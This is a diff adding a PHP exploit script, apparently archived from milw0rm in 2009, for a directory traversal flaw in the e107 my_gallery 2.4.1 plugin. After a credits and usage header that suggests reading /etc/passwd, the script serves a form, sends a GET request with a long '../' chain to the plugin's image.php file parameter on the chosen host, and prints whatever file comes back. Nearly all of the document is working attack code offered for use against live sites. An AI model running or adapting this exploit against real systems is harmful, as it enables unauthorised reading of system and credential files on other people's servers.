@@ -1,0 +1,78 @@
+<?php
+
+/*
+
+============================================
+[o] e107 Plugin my_gallery 2.4.1 Exploit [o]
+============================================
+
+Bug [f]ound by NoGe - noge.code@gmail.com
+Exploit [c]oded by Vrs-hCk - d00r@telkom.net
+
+* Plugin my_gallery create photo gallery.
+* Powered by Highslide JS script.
+* With random gallery menu and navigation menu.
+* Has a comment system, ratings and search of images.
+
+Download e107 my_gallery 2.4.1 Plugin
+http://code.google.com/p/e107mygalleryplugin/downloads/list
+
+
+=============
+[o] Usage [o]
+=============
+
+Web 2 XPL << fill with site who use e107 Plugin my_gallery
+File 2 Read << fill with file or directory you want to read
+
+Web 2 XPL : www.contoh.com
+File 2 Read : /etc/passwd
+
+Then Go!!!
+
+
+==============
+[o] Greetz [o]
+==============
+
+MainHack BrotherHood [ http://news.serverisdown.org ]
+Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 Angela Zhang
+H312Y yooogy mousekill }^-^{ loqsa zxvf martfella
+skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke
+
+FUCK TERORIS!!
+
+*/
+
+$vuln  = '/e107_plugins/my_gallery/image.php?file=';
+$trasv = '/../../../../../../../../../../../../../../..';
+
+echo "<form method=POST>
+Web 2 XPL : <input type=\"text\" name=\"host\" size=30>
+File 2 Read : <input type=\"text\" name=\"file\" size=30>
+<input type=submit value=\"Go!!!\" name=\"_xpl\">
+<br><br>";
+
+if ($_POST['_xpl']) {
+	$data .= "GET /{$vuln}{$trasv}{$file} HTTP/1.1\r\n";
+	$data .= "Host: {$host}\r\n";
+	$data .= "Connection: close\r\n\r\n";
+	$html  = sendpacket($host,$data);
+	print '<pre>'.htmlspecialchars($html).'</pre>';
+}
+
+echo "</form>";
+
+function sendpacket($host,$data) {
+	if (!$sock = @fsockopen($host,80)) {
+		die("[!] Connection refused, try again!\n");
+	}
+	fputs($sock,$data);
+	while (!feof($sock)) { $html .= fgets($sock); }
+	fclose($sock);
+	return $html;
+}
+
+?>
+
+# milw0rm.com [2009-07-23]
